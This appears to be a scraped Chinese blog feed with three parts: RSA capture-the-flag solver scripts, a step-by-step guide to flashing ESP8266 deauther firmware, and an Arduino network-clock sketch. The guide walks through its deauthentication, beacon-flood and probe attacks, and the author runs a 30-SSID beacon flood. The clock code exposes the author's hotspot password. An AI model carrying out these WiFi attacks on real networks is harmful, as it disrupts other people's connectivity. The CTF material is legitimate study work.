Int(\u0026#39;q\u0026#39;) e=13429379 c=37332862741675346229583169567152164430146499089312685908851183340452190598886333615853155498508415408089581801883370302481709390297776618601480360810070871814397706612573141312688883403426524175246063930832326746678005856762803341556751580794356126079747464232058718190249354501040556617161761929732923280943 s.add(p*p+q*q==238420776178584617049288032161547024466861975342369979628141562234373353220453353664649365343450804384502930281279147426842077646603010195201716387182635666909277032847358758494468148859529242190073633027688389710139393207656988607106191515067517636570736117553740915720326677382496072451079775448599321604322) s.add(p-q==-611654557241875384641098249625799792635443181689527967382700141143931101340384965139162727396181951280954636964792364891275776715479040790020462586306760) s.add(p\u0026gt;0) if s.check() == sat: print(s.model()) q_ = 11219894245840060444506904094146935763848067056819142420884683915798749496281087039417606929306730027157980578915189929943231226763671304112340611018151061 p_ = 10608239688598185059865805844521135971212623875129614453501983774654818394940702074278444201910548075877025941950397565051955450048192263322320148431844301 assert(s.model()[q] == q_) assert(s.model()[p] == p_) n = p_*q_ phi = (p_-1)*(q_-1) d = gmpy2.invert(e, phi) m = gmpy2.powmod(c, d, n) print(long_to_bytes(m))   [NCTF2019]childRSA sieve_base是前10000个素数，整花里胡哨的，yafu可以直接分解n得到p q\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import gmpy2 from random import choice from Crypto.Util.number import isPrime, sieve_base as primes, long_to_bytes # from flag import flag def getPrime(bits): while True: n = 2 while n.bit_length() \u0026lt; bits: n *= choice(primes) if isPrime(n + 1): return n + 1 e = 0x10001 # m = int.from_bytes(flag.encode(), \u0026#39;big\u0026#39;) # p, q = [getPrime(2048) for _ in range(2)] # n = p * q n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 p = 178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 q = 184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867 phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) m = pow(c,d,n) print(long_to_bytes(m))   [HDCTF2019]bbbbbbrsa c解密后都直接给了，直接爆破就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import gmpy2 import base64 from Crypto.Util.number import * p = 177077389675257695042507998165006460849 n = 37421829509887796274897162249367329400988647145613325367337968063341372726061 c = \u0026#34;==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM\u0026#34; c = int(base64.b64decode(c[::-1])) q = n/p phi = (p-1)*(q-1) for e in range(50000,70000): if gmpy2.gcd(e, phi)==1: d = gmpy2.invert(e, phi) m = pow(c,d,n) try: flag = long_to_bytes(m) if \u0026#34;{\u0026#34; in flag and \u0026#34;}\u0026#34; in flag: print(flag) break except: print(\u0026#34;e:\u0026#34;,e)   [BJDCTF2020]RSA 爆破e，给了两个n，q是最大公约数，简单求一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  from Crypto.Util.number import getPrime,bytes_to_long,long_to_bytes import gmpy2 # flag=open(\u0026#34;flag\u0026#34;,\u0026#34;rb\u0026#34;).read() # p=getPrime(1024) # q=getPrime(1024) # assert(e\u0026lt;100000) # n=p*q # m=bytes_to_long(flag) # c=pow(m,e,n) # print c,n # print pow(294,e,n) # p=getPrime(1024) # n=p*q # m=bytes_to_long(\u0026#34;BJD\u0026#34;*32) # c=pow(m,e,n) # print c,n \u0026#39;\u0026#39;\u0026#39; output: 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 \u0026#39;\u0026#39;\u0026#39; n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 cflag = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 # for e in range(100000): # if pow(294,e,n1) == 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018: # print(e) # break e = 52361 n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 q = gmpy2.gcd(n1, n2) p = n1/q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) mflag = pow(cflag, d, n1) print(long_to_bytes(mflag))   [BJDCTF2020]rsa_output 共模攻击，扩展欧几里得\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  import gmpy2 from Crypto.Util.number import * n = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111 e1 = 2767 e2 = 3659 c1 = 20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599 c2 = 11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227 assert(gmpy2.gcd(e1,e2)==1) gcd, s, t = gmpy2.gcdext(e1, e2) assert(e1*s+e2*t==1) print(gcd, s, t) s = -s c1 = gmpy2.invert(c1, n) ms = pow(c1, s, n) mt = pow(c2, t, n) m = ms*mt%n # print(m) print(long_to_bytes(m))   [ACTF新生赛2020]crypto-rsa0 签到题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  from Crypto.Util.number import * import random import gmpy2 e=65537 p = 9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411 q = 7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223 c = 50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350 n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m))   [GWCTF 2019]BabyRSA flag分成两段，yafu解N，z3一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  import gmpy2 import sympy from z3 import * from Crypto.Util.number import * # flag = \u0026#39;GWHT{******}\u0026#39; # secret = \u0026#39;******\u0026#39; # assert(len(flag) == 38) # # half = len(flag) / 2 # flag1 = flag[:19] # flag2 = flag[19:] # secret_num = getPrime(1024) * bytes_to_long(secret) # p = sympy.nextprime(secret_num) # q = sympy.nextprime(p) # N = p * q # e = 0x10001 # F1 = bytes_to_long(flag1) # F2 = bytes_to_long(flag2) # m1 = F1 + F2 # m2 = pow(F1, 3) + pow(F2, 3) # assert(m2 \u0026lt; N) # c1 = pow(m1, e, N) # c2 = pow(m2, e, N) # output = open(\u0026#39;secret\u0026#39;, \u0026#39;w\u0026#39;) # output.write(\u0026#39;N=\u0026#39; + str(N) + \u0026#39;\\n\u0026#39;) # output.write(\u0026#39;m1=\u0026#39; + str(c1) + \u0026#39;\\n\u0026#39;) # output.write(\u0026#39;m2=\u0026#39; + str(c2) + \u0026#39;\\n\u0026#39;) # output.close() e = 0x10001 N = 636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163 c1 = 90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239 c2 = 487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546 p = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737 q = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699 assert(p*q==N) phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m1 = pow(c1, d, N) m2 = pow(c2, d, N) # print(int(m1)) # 2732509502629189160482346120094198557857912754 # print(int(m2)) # 5514544075236012543362261483183657422998274674127032311399076783844902086865451355210243586349132992563718009577051164928513093068525554 s = Solver() f1 = Int(\u0026#39;f1\u0026#39;) f2 = Int(\u0026#39;f2\u0026#39;) s.add(pow(f1,3)+pow(f2,3)==5514544075236012543362261483183657422998274674127032311399076783844902086865451355210243586349132992563718009577051164928513093068525554) s.add(f1+f2==2732509502629189160482346120094198557857912754) # if s.check() == sat: # print(s.model()) # [f2 = 1141553212031156130619789508463772513350070909, # f1 = 1590956290598033029862556611630426044507841845] f1 = 1590956290598033029862556611630426044507841845 f2 = 1141553212031156130619789508463772513350070909 flag1 = long_to_bytes(f1) flag2 = long_to_bytes(f2) print(\u0026#34;flag:\u0026#34;, flag1+flag2)   [WUSTCTF2020]babyrsa 1 2 3 4 5 6 7 8 9 10 11 12 13 14  import gmpy2 import sympy from z3 import * from Crypto.Util.number import * c = 28767758880940662779934612526152562406674613203406706867456395986985664083182 n = 73069886771625642807435783661014062604264768481735145873508846925735521695159 e = 65537 p = 189239861511125143212536989589123569301 q = 386123125371923651191219869811293586459 phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m))   RSA4 广播攻击\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  import gmpy2 from Crypto.Util.number import * def CRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M n = [] c = [] n1 = int(str(331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004),5) c1 = int(str(310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243),5) n2 = int(str(302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114),5) c2 = int(str(112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344),5) n3 = int(str(332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323),5) c3 = int(str(10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242),5) n.extend([n1,n2,n3]) c.extend([c1,c2,c3]) m3 = CRT(n, c) m = gmpy2.iroot(m3, 3)[0] # print(m) print(long_to_bytes(m))   [NCTF2019]babyRSA phi位数预估\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  from Crypto.Util.number import * from z3 import * from sympy import * import gmpy2 e = 0x10001 d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913 c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804 p=0 q=0 for k in range(pow(2,15),pow(2,16)): if (e*d-1)%k==0: p=prevprime(gmpy2.iroot((e*d-1)//k,2)[0]) q=nextprime(p) if (p-1)*(q-1)*k==(e*d-1): break n=p*q m=gmpy2.powmod(c,d,n) print(long_to_bytes(m))   ","description":"","id":16,"section":"posts","tags":["CTF","RSA","密码学"],"title":"BUUCTF RSA相关题目题解","uri":"https://ruokeqx.gitee.io/posts/buuctf-rsa/"},{"content":"起因 国赛者，ylb办而废之，有人整活如下。\n听人谈之，esp8266也。淘宝搜之，十余元也，遂下单。\n软件准备 https://sparks.gogo.co.nz/ch340.html下载esp8266驱动CH340\nhttps://github.com/SpacehuhnTech/esp8266_deauther/releases下载固件Latest releas\nhttps://github.com/nodemcu/nodemcu-flasher/tree/master/Win64/Release下载Windows版烧录软件（也可以用esptool 直接pip install就行）\nhttps://www.arduino.cc/en/Main/Software下载arduino，虽然我刷的时候没用到QWQ\n烧录 ①此电脑-\u0026gt;管理-\u0026gt;设备管理器-\u0026gt;端口-\u0026gt;找到esp8266的端口 我是COM5\n②Config里齿轮按钮选择你要烧录的（就是那个bin文件）\n③Advanced里面把波特率改成9600 不过别人不改也没事\n④点击Operation界面Flash按钮就能开始烧录了 然后就是下图的样子 等大概十分钟？\n开始整活 烧录好了插拔一下电源重启会有一个叫“pwned”的wifi，密码是\u0026quot;deauther\u0026quot; 连接上后访问http://192.168.4.1进入管理界面。\nSCAN SSIDs Attacks Settings四个选项，四个功能模块。\nSSIDs里面设置要Attack的对象属性，下方红色大写 REMOVE ALL可以移除预设的一些东西。上方配置参数并添加到下方列表，我此处添加30个名叫\u0026quot;hacked_by_Qfrost\u0026quot;的wifi。\n进入Attacks正式攻击，三种模式，懒得翻译QWQ\n Deauth\n Closes the connection of WiFi devices by sending deauthentication frames to access points and client devices you selected.\nThis is only possible because a lot of devices don\u0026rsquo;t use the 802.11w-2009 standard that offers a protection against this attack.\nPlease only select one target! When you select multiple targets that run on different channels and start the attack, it will quickly switch between those channels and you have no chance to reconnect to the access point that hosts this web interface.\n Beacon\n Beacon packets are used to advertise access points. By continuously sending beacon packets out, it will look like you created new WiFi networks.\nYou can specify the network names under SSIDs.\n Probe\n Probe requests are sent by client devices to ask if a known network is nearby.\nUse this attack to confuse WiFi trackers by asking for networks that you specified in the SSID list.\nIt\u0026rsquo;s unlikely you will see any impact by this attack with your home network.\n我要整30个同名wifi复现ylbsb场景所以就选Beacon，点击Beacon右侧 START 就可以无脑开始了。\n最后给大家康康整的活\n后续 老师有个新苗项目，让我搞硬件。于是想再来玩玩这esp8266。\n网络时钟 项目是这个：https://github.com/flyAkari/ESP8266_Network_Clock\n学习连接：\n基于ssd1306驱动的12864oled屏介绍\nESP8266连接OLED显示屏并显示位图图像\nu8g2库\n他有编译好的二进制文件，先拿这个up的整一波。\n给esp8266和OLED屏接线，如下表\u0026amp;图。\n   OLED屏接口 ESP8266接口     GND G（就是GND）   VCC 3V（一般推荐是接5V，但是这个板子只有3V）   SCL D1（GPIO5）   SDA D2（GPIO4）   下面这句是Arduino的一个屏幕驱动库u8g2 的wiki里关于这个屏幕的一句介绍。     I2C, IIC or TWI: Inter-Integrated Circuit Bus which has two signals: Clock (SCL) and Data (SDA).\n连接好后就可以烧录二进制文件进板子了，烧录详情见另一个博客。烧录好了按一下板子上的RST按键就启动了。\n连接了创键的无密码wifi后进入192.168.4.1就可以修改配置然后让板子连上我们自己的wifi然后联网同步时间。(没错上面的就是我的热点密码，欢迎来连.jpg)\n连好wifi后不久就可以看到时间同步了，第一次整还挺有意思的。\n代码如下，稍微修改一下就假装可以是自己的。后续自己研究一下写一个(咕咕咕)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263  /* 作者：flyAkari 会飞的阿卡林 bilibili UID:751219 * 本代码适用于ESP8266 NodeMCU + 12864显示屏 * 7pin SPI引脚，正面看，从左到右依次为GND、VCC、D0、D1、RES、DC、CS * ESP8266 --- OLED * 3V --- VCC * G --- GND * D7 --- D1 * D5 --- D0 * D2orD8--- CS * D1 --- DC * RST --- RES * 4pin IIC引脚，正面看，从左到右依次为GND、VCC、SCL、SDA * ESP8266 --- OLED * 3.3V --- VCC * G (GND) --- GND * D1(GPIO5)--- SCL * D2(GPIO4)--- SDA */ #include \u0026lt;TimeLib.h\u0026gt;#include \u0026lt;ESP8266WiFi.h\u0026gt;#include \u0026lt;WiFiUdp.h\u0026gt;#include \u0026lt;SPI.h\u0026gt;#include \u0026lt;DYWiFiConfig.h\u0026gt;#include \u0026lt;U8g2lib.h\u0026gt; //若屏幕使用SH1106，只需把SSD1306改为SH1106即可 //U8G2_SSD1306_128X64_NONAME_F_4W_HW_SPI u8g2(U8G2_R0, /* cs=*/4, /* dc=*/5, /* reset=*/3); U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE); //U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE, /* clock=*/ 4, /* data=*/ 5); //D-duino  DYWiFiConfig wificonfig; ESP8266WebServer webserver(80); //#define DEF_WIFI_SSID \u0026#34;D1\u0026#34; //#define DEF_WIWI_PASSWORD \u0026#34;01234567890\u0026#34; #define DEF_WIFI_SSID \u0026#34;ruokeqx\u0026#39;s phone\u0026#34; #define DEF_WIWI_PASSWORD \u0026#34;1234qwer\u0026#34; #define AP_NAME \u0026#34;ruokeqx\u0026#34; //dev void wificb(int c) { Serial.print(\u0026#34;=-=-=-=-\u0026#34;); Serial.println(c); } static const char ntpServerName[] = \u0026#34;ntp1.aliyun.com\u0026#34;; //NTP服务器，阿里云 const int timeZone = 8; //时区，北京时间为+8  WiFiUDP Udp; unsigned int localPort = 8888; // 用于侦听UDP数据包的本地端口  time_t getNtpTime(); void sendNTPpacket(IPAddress\u0026amp; address); void oledClockDisplay(); void sendCommand(int command, int value); void initdisplay(); boolean isNTPConnected = false; const unsigned char xing[] U8X8_PROGMEM = { 0x00, 0x00, 0xF8, 0x0F, 0x08, 0x08, 0xF8, 0x0F, 0x08, 0x08, 0xF8, 0x0F, 0x80, 0x00, 0x88, 0x00, 0xF8, 0x1F, 0x84, 0x00, 0x82, 0x00, 0xF8, 0x0F, 0x80, 0x00, 0x80, 0x00, 0xFE, 0x3F, 0x00, 0x00 }; /*星*/ const unsigned char liu[] U8X8_PROGMEM = { 0x40, 0x00, 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x20, 0x02, 0x20, 0x04, 0x10, 0x08, 0x10, 0x10, 0x08, 0x10, 0x04, 0x20, 0x02, 0x20, 0x00, 0x00 }; /*六*/ void setup() { Serial.begin(115200); while (!Serial) continue; Serial.println(\u0026#34;NTP Clock oled version v1.1\u0026#34;); Serial.println(\u0026#34;Designed by flyAkari\u0026#34;); initdisplay(); u8g2.clearBuffer(); u8g2.setFont(u8g2_font_unifont_t_chinese2); u8g2.setCursor(0, 14); u8g2.print(\u0026#34;Waiting for WiFi\u0026#34;); u8g2.setCursor(0, 30); u8g2.print(\u0026#34;connection...\u0026#34;); u8g2.setCursor(0, 47); u8g2.print(\u0026#34;flyAkari\u0026#34;); u8g2.setCursor(0, 64); u8g2.print(\u0026#34;192.168.4.1\u0026#34;); u8g2.sendBuffer(); Serial.println(\u0026#34;OLED Ready\u0026#34;); Serial.print(\u0026#34;Connecting WiFi...\u0026#34;); wificonfig.begin(\u0026amp;webserver, \u0026#34;/\u0026#34;); DYWIFICONFIG_STRUCT defaultConfig = wificonfig.createConfig(); strcpy(defaultConfig.SSID, DEF_WIFI_SSID); strcpy(defaultConfig.SSID_PASSWORD, DEF_WIWI_PASSWORD); strcpy(defaultConfig.HOSTNAME, AP_NAME); strcpy(defaultConfig.APNAME, AP_NAME); wificonfig.setDefaultConfig(defaultConfig); wificonfig.enableAP(); while (WiFi.status() != WL_CONNECTED) { wificonfig.handle(); //若不需要Web后台，可以注释掉此行  //Serial.println(\u0026#34;Waiting for Connection...\u0026#34;);  } Serial.println(\u0026#34;\u0026#34;); Serial.println(\u0026#34;WiFi connected\u0026#34;); Serial.println(\u0026#34;IP address: \u0026#34;); Serial.println(WiFi.localIP()); Serial.println(\u0026#34;Starting UDP\u0026#34;); 